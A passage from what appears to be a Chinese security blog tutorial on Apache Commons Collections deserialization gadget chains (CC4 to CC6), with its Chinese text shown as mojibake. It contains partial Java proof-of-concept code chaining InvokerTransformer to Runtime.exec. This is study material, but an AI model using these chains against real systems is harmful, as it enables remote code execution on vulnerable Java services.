<p>è¯¥æ–¹æ³•çš„åŒºåˆ«åœ¨äºï¼Œæˆ‘ä»¬ä¸éœ€è¦å…ˆä¼ªè£…<code>transformers</code>é‡Œçš„å„ç§<code>transformer</code>ï¼Œç›¸åï¼Œæˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªä¸å«è‡ªå®šä¹‰<code>comparator</code>çš„PriorityQueueï¼Œåœ¨addå®Œä¹‹åï¼Œæˆ‘ä»¬å†å°†<code>comparator</code>åŠ è¿›è¿™ä¸ª<code>PriorityQueue</code>ï¼Œè¿™æ ·å°±å·§å¦™çš„ç»•è¿‡äº†<code>add()</code>è§¦å‘ç‚¹</p>
<h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>cc4 = cc2å’Œcc3çš„æ··åˆä½“</p>
<blockquote>
<p>Gadget chain:<br> ObjectInputStream.readObject()<br>     PriorityQueue.readObject()<br>       TransformingComparator()<br>         ChainedTransformer.transform()<br>             ConstantTransformer.transform()<br>                 InstantiateTransformer.transform()<br>                     TrAXFilter.TrAXFilter()<br>                         â€¦<br>                             exec()</p>
</blockquote>
<h3 id="Reference-3"><a href="#Reference-3" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/233393#h3-8">ysoserial CommonsCollections3/4 è¯¦ç»†åˆ†æ</a></p>
<p><a target="_blank" rel="noopener" href="https://0range228.github.io/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/">Javaååºåˆ—åŒ–åˆ©ç”¨é“¾è¡¥å…¨è®¡åˆ’</a></p>
<h2 id="Commons-Collections-5"><a href="#Commons-Collections-5" class="headerlink" title="Commons Collections 5"></a>Commons Collections 5</h2><h3 id="ç¯å¢ƒæ­å»º-4"><a href="#ç¯å¢ƒæ­å»º-4" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.8</li>
</ul>
<h3 id="åˆ©ç”¨é“¾æ„é€ -1"><a href="#åˆ©ç”¨é“¾æ„é€ -1" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><h4 id="ChainedTransformer-amp-ConstantTransformer-amp-InvokerTransformer"><a href="#ChainedTransformer-amp-ConstantTransformer-amp-InvokerTransformer" class="headerlink" title="ChainedTransformer&amp;ConstantTransformer&amp;InvokerTransformer"></a>ChainedTransformer&amp;ConstantTransformer&amp;InvokerTransformer</h4><p>åœ¨cc5ååŠéƒ¨åˆ†ï¼Œæˆ‘ä»¬ä¾ç„¶ä½¿ç”¨ä¹‹å‰ç”¨è¿‡çš„åˆ©ç”¨é“¾</p>
<blockquote>
<p>ChainedTransformer.transform()</p>
<p>â€‹    ConstantTransformer.transform()</p>
<p>â€‹        InvokerTransformer.transform()</p>
<p>â€‹            Runtime.exec()</p>
</blockquote>
<p>åœ¨<code>commons-collections:3.1-3.2.1</code>ä¸­ï¼Œæˆ‘ä»¬çš„<code>InvokerTransformer</code>å­˜åœ¨ï¼Œæ‰€ä»¥å¯ä»¥ç»§ç»­åˆ©ç”¨å®ƒæ¥ä½œä¸ºæˆ‘ä»¬åˆ©ç”¨é“¾çš„ä¸€éƒ¨åˆ†ã€‚</p>
<h4 id="LazyMap-1"><a href="#LazyMap-1" class="headerlink" title="LazyMap"></a>LazyMap</h4><p>å’Œcc1ä¸€æ ·ï¼Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨**LazyMap.get()**æ¥è§¦å‘<code>ChainedTransformer.transform()</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>factory<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„ä¼šæ‰§è¡Œfactoryï¼Œæˆ‘ä»¬å°†factoryèµ‹å€¼ä¸ºæˆ‘ä»¬çš„chainedTrasnformerå³å¯</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> value<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span>map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>LazyMap</code>çš„æ„é€ å‡½æ•°æ˜¯<code>protected</code>çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>LazyMap.decorate()</code>æ¥å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„<code>LazyMap instance</code>ï¼Œå…·ä½“çš„åœ¨ä¹‹å‰çš„cc1å’Œcc3éƒ½æœ‰è®²è§£è¿‡ã€‚</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Map</span> <span class="token function">decorate</span><span class="token punctuation">(</span><span class="token class-name">Map</span> map<span class="token punctuation">,</span> <span class="token class-name">Transformer</span> factory<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">LazyMap</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> factory<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>ç°åœ¨æˆ‘ä»¬å¯ä»¥æš‚æ—¶å†™å‡ºå¦‚ä¸‹payloadï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections5</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

        <span class="token comment">/*
         * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
         * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//åˆ›å»ºinvokerTransformerï¼Œå¹¶åˆ©ç”¨constructorå¯¹iMethodNameã€iParamTypesã€iArgsè¿›è¡Œèµ‹å€¼</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token comment">//å°†ä¸Šé¢çš„æ•°ç»„ç”¨chainedTransformerä¸²èµ·æ¥ï¼Œæ•°ç»„é‡Œçš„transformerä¼šè¢«æŒ¨ä¸ªæ‰§è¡Œtransform()æ–¹æ³•</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        innerMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Map</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//return a new lazyMap</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨cc1ä¸­ï¼Œæˆ‘ä»¬æœ‰ç”¨åˆ°<code>AnnotationInvocationHandler</code>ï¼Œä½†<code>AnnotationInvocationHandler</code>åœ¨JDK1.8åšäº†é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨åˆ°äº†<code>BadAttributeValueExpException</code></p>
<hr>
<p>å†™ç€ä¸€åŠå‘ç°ä¸å¯¹åŠ²ï¼Œä¹‹å‰å…¶å®æœ‰å†™äº†cc5ï¼Œå†™åœ¨cc1çš„åœ°æ–¹é‡å¤äº† LOL</p>
<p>å‰©ä¸‹çœ‹<a href="#cc5">è¿™é‡Œ</a></p>
<hr>
<h2 id="Commons-Collections-6"><a href="#Commons-Collections-6" class="headerlink" title="Commons Collections 6"></a>Commons Collections 6</h2><h3 id="ç¯å¢ƒæ­å»º-5"><a href="#ç¯å¢ƒæ­å»º-5" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.7&amp;1.8</li>
</ul>
<h3 id="åˆ©ç”¨é“¾æ„é€ -2"><a href="#åˆ©ç”¨é“¾æ„é€ -2" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><h4 id="å‰è¨€-1"><a href="#å‰è¨€-1" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>åœ¨cc5ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>TiedMapEntry.toString()</code>æ¥æ‰§è¡Œ<code>TiedMap.getValue()</code>ï¼Œå†ç”±<code>BadAttributeInvocationHandler</code>æ¥æ‰§è¡Œ<code>TiedMapEntry.toString()</code>ï¼Œä»è€Œå®Œæˆåˆ©ç”¨é“¾çš„è¡”æ¥ã€‚æˆ‘ä»¬åœ¨cc6ä¸­ï¼Œå°†å¦å¤–å¯»æ‰¾ä¸€æ¡é“¾ï¼Œèƒ½å¤Ÿè¿æ¥<code>TiedMapEntry.getValue()-&gt;Lazymap.get() -&gt; ChainedTransformer.transform()</code></p>
<h4 id="TiedMapEntry-hashCode"><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry.hashCode()"></a>TiedMapEntry.hashCode()</h4><p>æˆ‘ä»¬å‘ç°ï¼Œåœ¨<strong>hashCode()<strong>æ–¹æ³•ä¸­ä¹Ÿcallåˆ°äº†</strong>getValue()</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name">Object</span> value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œä¹Ÿcallåˆ°äº†åŒç±»ä¸‹çš„getValue()</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> value<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>é‚£ä¹ˆä»€ä¹ˆèƒ½å¤Ÿæ‰§è¡Œ<code>hashCode()</code>å‘¢</p>
<h4 id="HashMap-hash"><a href="#HashMap-hash" class="headerlink" title="HashMap.hash()"></a>HashMap.hash()</h4><p>æˆ‘ä»¬åœ¨<code>HashMap</code>ä¸‹æ‰¾åˆ°äº†<code>hash()</code>æ–¹æ³•ï¼Œå…¶ä¸­callåˆ°äº†<code>hashCode()</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token class-name">Object</span> k<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> h <span class="token operator">=</span> hashSeed<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">!=</span> h <span class="token operator">&amp;&amp;</span> k <span class="token keyword">instanceof</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>misc<span class="token punctuation">.</span></span>Hashing</span><span class="token punctuation">.</span><span class="token function">stringHash32</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    h <span class="token operator">^=</span> k<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è¿™é‡Œæˆ‘ä»¬å¦‚æœç»™kèµ‹å€¼ä¸ºTiedMapEntryçš„instanceå°±å¯ä»¥æ‰§è¡Œå‘½ä»¤</span>

    <span class="token comment">// This function ensures that hashCodes that differ only by</span>
    <span class="token comment">// constant multiples at each bit position have a bounded</span>
    <span class="token comment">// number of collisions (approximately 8 at default load factor).</span>
    h <span class="token operator">^=</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> h <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>h <span class="token operator">>>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç»§ç»­æ‰¾å¯ä»¥è¿æ¥<code>hash()</code>çš„æ–¹æ³•</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204145232237.png" alt="image-20211204145232237" loading="lazy"></p>
<p>æˆ‘ä»¬å‘ç°è¿™é‡Œæœ‰å¾ˆå¤šåœ°æ–¹éƒ½ç”¨åˆ°äº†<code>hash()</code>ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªåˆ†æ</p>
<h4 id="è°ƒç”¨hash-å¤„ä¸€ï¼ˆæ–¹æ³•ä¸€ï¼‰ï¼š"><a href="#è°ƒç”¨hash-å¤„ä¸€ï¼ˆæ–¹æ³•ä¸€ï¼‰ï¼š" class="headerlink" title="è°ƒç”¨hash()å¤„ä¸€ï¼ˆæ–¹æ³•ä¸€ï¼‰ï¼š"></a>è°ƒç”¨hash()å¤„ä¸€ï¼ˆæ–¹æ³•ä¸€ï¼‰ï¼š</h4><h5 id="HashMap-putForCreate-amp-HashMap-readObject"><a href="#HashMap-putForCreate-amp-HashMap-readObject" class="headerlink" title="HashMap.putForCreate() &amp; HashMap.readObject()"></a>HashMap.putForCreate() &amp; HashMap.readObject()</h5><p>æœ€åæˆ‘ä»¬æ‰¾åˆ°putForCreate()ï¼Œå‘ç°å®ƒè°ƒç”¨äº†<code>hash()</code>ä¸”å®ƒ<strong>ä¼šè¢«readObject()è°ƒç”¨</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">putForCreate</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token keyword">null</span> <span class="token operator">==</span> key <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å¦‚æœkeyä¸ä¸ºnull,è¿™é‡Œä¼šè°ƒç”¨hash(key)</span>
    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/**
     * Look for preexisting entry for key.  This will never happen for
     * clone or deserialize.  It will only happen for construction if the
     * input Map is a sorted map whose ordering is inconsistent w/ equals.
     */</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Object</span> k<span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span>
            <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> <span class="token punctuation">(</span>key <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            e<span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">createEntry</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204145642205.png" alt="image-20211204145642205" loading="lazy"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¡®å®šä½¿ç”¨è¿™ä¸ªé“¾äº†</p>
<blockquote>
<p>HashMap.readObject([key,value])-&gt;HashMap.putForCreate(key,value)-&gt;HashMap.hash(key)-&gt;key.hashcode()-&gt;TiedMapEntrykey.hashCode()-&gt;TiedMapEntry.getValue(this.key=chainedTransformer)-&gt;Lazymap.get(chainedTransformer) -&gt; ChainedTransformer.transform() -&gt; â€¦..</p>
</blockquote>
<p>æˆ‘ä»¬å°è¯•æ¥æ„é€ ä¸€ä¸‹<strong>POC</strong>:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>keyvalue<span class="token punctuation">.</span></span><span class="token class-name">TiedMapEntry</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span></span><span class="token class-name">BadAttributeValueExpException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CommonsCollections6</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>

        <span class="token comment">/*
         * å®¢æˆ·ç«¯æ„é€ payloadï¼Œå¹¶åºåˆ—åŒ–æ–‡ä»¶
         * */</span>
        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment">//è¿”å›Runtime Class</span>
                <span class="token comment">//è·å–getRuntimeæ–¹æ³•</span>
                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getDeclaredMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token comment">//call getRuntimeæ–¹æ³•å¾—åˆ°Runtimeå®ä¾‹</span>
